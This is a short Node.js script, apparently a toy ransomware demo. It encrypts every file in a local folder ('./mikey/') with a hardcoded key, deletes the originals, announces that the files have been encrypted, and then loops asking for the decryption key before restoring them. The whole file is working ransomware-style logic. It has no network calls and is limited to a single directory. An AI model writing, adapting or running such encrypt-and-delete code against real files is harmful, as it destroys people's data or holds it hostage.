const encryptor = require("file-encryptor");
const readlineSync = require("readline-sync");
const fs = require("fs");

const key = "Lebron";
const rempillo = "./mikey/";

const files = fs.readdirSync(rempillo);
let filesEncrypted = 0;

files.forEach((file) => {
  encryptor.encryptFile(`${rempillo}${file}`,`${rempillo}${file}.encrypt`,key,
    function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }
      fs.unlinkSync(`${rempillo}${file}`);
      filesEncrypted++;
      if (filesEncrypted === files.length) {
        console.log(
          `Your files have been encrypted.`
        );
        startDecryption();
      }
    }
  );
});

function startDecryption() {
  while (true) {
    const decryptionKey = readlineSync.question("Please Enter The Decryption Key: ");

    if (decryptionKey.toLowerCase() === "exit") {
      console.log("Exiting the process....");
      process.exit(1);
    }

    if (decryptionKey === key) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log(
        'Incorrect decryption key, type "exit" to quit.'
      );
    }
  }
}

function decryptFiles(decryptionKey) {
  const decryptedfiles = fs.readdirSync(rempillo);
  let filesDecrypted = 0;

  decryptedfiles.forEach((file) => {
    encryptor.decryptFile(
      `${rempillo}${file}`,`${rempillo}${file.replace(".encrypt", "")}`,decryptionKey,
      function (err) {
        if (err) {
          console.error("Error decrypting file:", err);
          return;
        }

        fs.unlinkSync(`${rempillo}${file}`);
        filesDecrypted++;

        if (filesDecrypted === decryptedfiles.length) {
          console.log(" Your Files Have been Decrypted");
          process.exit(1);
        }
      }
    );
  });
}
